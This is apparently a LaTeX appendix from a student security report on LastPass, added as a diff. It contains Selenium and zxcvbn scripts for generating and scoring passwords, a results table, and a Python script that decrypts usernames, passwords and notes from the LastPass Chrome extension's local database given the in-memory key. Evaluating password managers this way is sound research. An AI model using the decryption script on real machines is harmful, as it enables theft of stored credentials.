@@ -1,0 +1,252 @@
+% +---------------------------------------------------------------+
+% | Author :    Noémie Plancherel, HEIG-VD
+% | Date :      15.11.22
+% +---------------------------------------------------------------+
+
+\chapter{Annexes LastPass}
+\section{Génération de mots de passe}
+
+\begin{lstlisting}[language=java,label=script_gen_last, caption=Script pour la génération de mots de passe LastPass]
+// Initialisation du ChromeDriver
+System.setProperty("webdriver.chrome.driver", "chromedriver.exe");
+WebDriver driver = new ChromeDriver();
+// Liaison avec l'extension LastPass
+driver.get("https://lastpass.com/?ac=1");
+
+// Connexion au gestionnaire de mots de passe
+WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/div/form/div[1]/div/div/input"));
+WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/div/form/div[2]/div/input"));
+email.clear();
+email.sendKeys("$EMAIL");
+password.clear();
+password.sendKeys("$PASSWORD");
+driver.findElement(By.className("euz05gu0")).click();
+
+// Acces au menu de generation de mots de passe
+driver.switchTo().frame("newvault");
+driver.findElement(By.xpath("//*[@id=\"advancedMenuItem\"]/div/span")).click();
+driver.findElement(By.cssSelector("#generatePasswordMenuItem")).click();
+
+
+// Configuration du nombre de caracteres qu'on souhaite, ici on en veut 12
+WebElement numberCar = driver.findElement(By.xpath("//*[@id=\"lengthInput\"]"));
+numberCar.clear();
+numberCar.sendKeys("12");
+
+
+// On coche ou decoche les cases pour avoir que des lettres minuscules et majuscules
+WebElement digits = driver.findElement(By.xpath("//*[@id=\"generatePasswordDialogDropdownAdvancedOptions" +
+"\"]/div/span[2]/div[3]/div/label")).click();
+
+// Creation d'un fichier local
+pour recuperer tous les mots de passe generes
+File fout = new File("$OUTPUT_FILE");
+FileOutputStream fos = new FileOutputStream(fout);
+BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(fos));
+// Generation de tous les mots de passe et ecriture dans le fichier local ligne par ligne
+for (int i = 0; i < 10000; ++i) {
+	WebElement pass = driver.findElement(By.xpath("//*[@id=\"password\"]"));
+	bw.write(pass.getAttribute("value"));
+	bw.newLine();
+	WebElement refresh = driver.findElement(By.xpath("//*[@id=\"generateBtn\"]"));
+	refresh.click();
+}
+bw.close();
+driver.quit();
+\end{lstlisting}
+
+\begin{lstlisting}[language=java,label=script_test_last, caption=Script pour tester les mots de passe de LastPass]
+Zxcvbn zxcvbn = new Zxcvbn();
+Vector<Double> guesses_min = new Vector<>();
+Vector<String> weak_passwords = new Vector<>();
+
+BufferedReader br = new BufferedReader(new FileReader("$INPUT_FILE"));
+
+for (String line = br.readLine(); line != null; line = br.readLine()) {
+	Strength strength = zxcvbn.measure(line);
+	double guess = strength.getGuessesLog10();
+
+	if(guess <= Collections.min(guesses_min)) {
+		guesses_min.add(guess);
+		weak_passwords.add(line);
+	}
+}
+\end{lstlisting}
+
+\begin{table}[H]
+	\resizebox{\textwidth}{!}{%
+		\begin{tabular}{lcccccccc}
+			\hline\toprule
+			\multicolumn{1}{c}{\multirow{2}{*}{Nombre chars}} & \multirow{2}{*}{Composition} & \multirow{2}{*}{Mot de passe}                    & \multirow{2}{*}{\begin{tabular}[c]{@{}c@{}}Nombre d'essais\\  ($log_{10}$)\end{tabular}} & \multirow{2}{*}{\begin{tabular}[c]{@{}c@{}}Moyenne du\\ nombre d'essais\\ ($log_{10}$)\end{tabular}} & \multicolumn{4}{c}{Temps d'essai en fonction des attaques}                                                                                                                                                                                                                              \\ \cline{6-9}
+			\multicolumn{1}{c}{}                              &                              &                                                  &                                                                                     &                                                                                                 & \begin{tabular}[c]{@{}c@{}}Throttled online\\  attack\end{tabular} & \begin{tabular}[c]{@{}c@{}}Unthrottled online\\  attack\end{tabular} & \begin{tabular}[c]{@{}c@{}}Offline attack,\\  slow hash\end{tabular} & \begin{tabular}[c]{@{}c@{}}Offline attack,\\  fast hash\end{tabular} \\ \hline \midrule
+			\multirow{5}{*}{12}                               & ll                           & markZTkzuBfL                                     & 10.00000                                                                            & 11.95351                                                                                        & siècles                                                            & 31 ans                                                               & 12 jours                                                             & 1 seconde                                                            \\ \cline{2-9} 
+			& sd                           & \textasciicircum{}!09!!7\textasciicircum{}5\$\#@ & 8.00004                                                                             & 11.75474                                                                                        & siècles                                                            & 4 mois                                                               & 3 heures                                                             & \textgreater 1 seconde                                               \\ \cline{2-9} 
+			& ld                           & nQ5bwleUg3NE                                     & 9.85187                                                                             & 11.96165                                                                                        & siècles                                                            & 22 ans                                                               & 8 jours                                                              & \textgreater 1 seconde                                               \\ \cline{2-9} 
+			& ls                           & *IJNevertatw                                     & 9.95904                                                                             & 11.96757                                                                                        & siècles                                                            & 28 ans                                                               & 11 jours                                                             & \textgreater 1 secondes                                              \\ \cline{2-9} 
+			& all                          & QfQ!pKt*2323                                     & 10.00000                                                                            & 11.97474                                                                                        & siècles                                                            & 31 ans                                                               & 12 jours                                                             & 1 secondes                                                           \\ \hline\hline
+			\multirow{5}{*}{16}                               & ll                           & ruxnanaGdFVZTgtE                                 & 13.48979                                                                            & 15.93678                                                                                        & siècles                                                            & siècles                                                              & 96 ans                                                               & 51 minutes                                                           \\ \cline{2-9} 
+			& sd                           & \#93\&!!1949@\%432!                              & 12.22354                                                                            & 15.67387                                                                                        & siècles                                                            & siècles                                                              & 5 ans                                                                & 3 minutes                                                            \\ \cline{2-9} 
+			& ld                           & S3cR37t3sGj07GXX                                 & 13.28869                                                                            & 15.94858                                                                                        & siècles                                                            & siècles                                                              & 60 ans                                                               & 32 minutes                                                           \\ \cline{2-9} 
+			& ls                           & \&lpP\textasciicircum{}AUBxKJqUDDR               & 13.47712                                                                            & 15.95871                                                                                        & siècles                                                            & siècles                                                              & 93 ans                                                               & 50 minutes                                                           \\ \cline{2-9} 
+			& all                          & CV1b8C6Gr55g0!ng                                 & 13.42160                                                                            & 15.96274                                                                                        & siècles                                                            & siècles                                                              & 82 ans                                                               & 44 minutes                                                           \\ \hline\midrule
+			\multirow{5}{*}{20}                               & ll                           & dZkflsLXTnWTrEwqIWfx                             & 17.47712                                                                            & 19.92035                                                                                        & siècles                                                            & siècles                                                              & siècles                                                              & 12 jours                                                             \\ \cline{2-9} 
+			& sd                           & \&\&\&22051904!\#@44\%48\$                       & 16.02168                                                                            & 19.59983                                                                                        & siècles                                                            & siècles                                                              & siècles                                                              & 12 jours                                                             \\ \cline{2-9} 
+			& ld                           & UROJdj82Hn2UJLin3xkj                             & 18.04462                                                                            & 19.936259                                                                                       & siècles                                                            & siècles                                                              & siècles                                                              & 33 ans                                                               \\ \cline{2-9} 
+			& ls                           & oIUEG\$W\%AT!Uwh@tePAH                           & 17.77815                                                                            & 19.94897                                                                                        & siècles                                                            & siècles                                                              & siècles                                                              & 2 ans                                                                \\ \cline{2-9} 
+			& all                          & AYAiCyd5\&l!nd44l!3!l                            & 17.47712                                                                            & 20.00000                                                                                        & siècles                                                            & siècles                                                              & siècles                                                              & 11 mois                                                              \\ \hline\toprule
+		\end{tabular}%
+	}
+\caption{Résultats de la robustesse des mots de générés sur LastPass}
+\label{lp_result}
+\end{table}
+
+\section{Accès mémoire}
+
+\begin{lstlisting}[language=python,label=script_dec_lp, caption=Script pour déchiffrer les entrées LastPass]
+#!/usr/bin/python
+# Author : Leo Corthes
+
+import base64
+import re
+import sys
+import hashlib
+from Crypto.Cipher import AES
+from Crypto import Random
+import string
+import sqlite3
+from sqlite3 import Error
+from shutil import copyfile
+from pathlib import Path
+
+# Geto connnection to local SQLite database
+# http://www.sqlitetutorial.net/sqlite-python/sqlite-python-select/
+def create_connection(db_file):
+	try:
+		conn = sqlite3.connect(db_file)
+		return conn
+	except Error as e:
+		print(e)
+	return None
+
+# Select the field which contains the LastPass encrypted data
+def selectEntries(conn):
+	cur = conn.cursor()
+	cur.execute("SELECT data FROM LastPassData where type=='accts'")
+	rows = cur.fetchall()
+	for row in rows:
+		return str(row)
+
+BLOCK_SIZE = 16
+pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
+unpad = lambda s: s[:-ord(s[len(s) - 1:])]
+printset = set(string.printable)
+
+# AES-CBC 256 encryption
+# Inspired and modified from : https://www.quickprogrammingtips.com/python/aes-256-encryption-and-#decryption-in-python.html
+def encrypt(raw, password):
+	private_key=bytes.fromhex(KEY)
+
+	raw = pad(raw)
+	iv=IV
+	cipher = AES.new(private_key, AES.MODE_CBC, iv)
+	return base64.b64encode(iv + cipher.encrypt(raw.encode("utf-8")))
+
+# AES-CBC 256 Decryption
+def decrypt(enc, key):
+	private_key=bytes.fromhex(key)
+	enc = base64.b64decode(enc)
+	iv = enc[:16]
+	retVal=""
+	try:
+		cipher = AES.new(private_key, AES.MODE_CBC, iv)
+		retVal = unpad(cipher.decrypt(enc[16:]))
+	except:
+		pass
+	return retVal
+
+# Look for hexadecimal strings and convert them into ASCII. The URL is stored this way
+def lookForWebsiteName(fields):
+	b = re.findall(b"[0123456789ABCDEFabcdef]*", fields)
+	for e in b:
+		if len(e.decode()) > 3:
+			try:
+				print("Website : " + bytes.fromhex(e.decode()).decode('utf-8'))
+			except:
+				pass
+
+# Decrypt the username. The encrypted username starts at the beginning of a field and ends with \0\0\0
+def decryptUsername(key, field):
+	try:
+		# First part of the filed contains the username
+		encUsername=field.split(b"\0\0\0")[0]
+		print("Username : " + decrypt(base64.b64encode(encUsername), key).decode())
+	except:
+		pass
+
+# Decrypt the password. The encrypted password is either stored directly after the encrpyted username.
+# Or after the encrpyted username with a "!" as separator.
+# It can also be stored in a completely different field.
+def decryptPassword(key, field):
+	try:
+		# Second part of the field contains the password
+		
+		encPassword=field.split(b"\0\0\0")[1]
+		if '!' in str(encPassword):
+			encPassword=encPassword.split(b"!")[1]
+			print("Password : " + decrypt(base64.b64encode(encPassword), key).decode())
+		else :
+			print("Password : " + decrypt(base64.b64encode(encPassword), key).decode())
+	except:
+		pass
+
+# Decrypt whatever can be found in a field. It could be a username, a password, a note, an entry name, ...
+def decryptChunk(key, field, name="Data"):
+	try :
+		chunk=field.split(b"\0\0\0")[0]
+		print(name + " : " + decrypt(base64.b64encode(chunk), key).decode())
+	except:
+		pass
+		
+def main():
+	if (len(sys.argv) == 2):
+		database = str(".config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0/9")
+		key = sys.argv[1]
+	elif(len(sys.argv) == 3):
+		database = sys.argv[1]
+		key = sys.argv[2]
+	else :
+		print("You must provide the path to the database and the file containing the potential keys as argument. If you provide nothing, default values will be used.")
+		print("You must provide key that can be found in Javascript as g_local_key")
+		exit()
+	
+	# Connecting to the local database and getting the encrypted data
+	conn = sqlite3.connect(database)
+	
+	with conn:
+	encData=selectEntries(conn)
+	
+	# Decoding the data and separate each entry
+	encDataBin=base64.b64decode(encData)
+	entries=(encDataBin.split(b"ACCT"))
+	entries.pop(0)
+	
+	
+	# Iterating over all the entries
+	for entry in entries:
+		print("================ NEW ENTRY ================")
+		fields=[]
+		fields=entry.split(b"!!")
+		
+		# Iterating over each field, trying to find some artefacts
+		for i in range(0, len(fields)):
+			lookForWebsiteName(fields[i])
+		for i in range(0, len(fields)):
+			decryptUsername(key, fields[i])
+		for i in range(0, len(fields)):
+			decryptPassword(key, fields[i])
+		for i in range(0, len(fields)):
+			decryptChunk(key, fields[i])
+	
+if __name__ == "__main__":
+	main()
+\end{lstlisting}
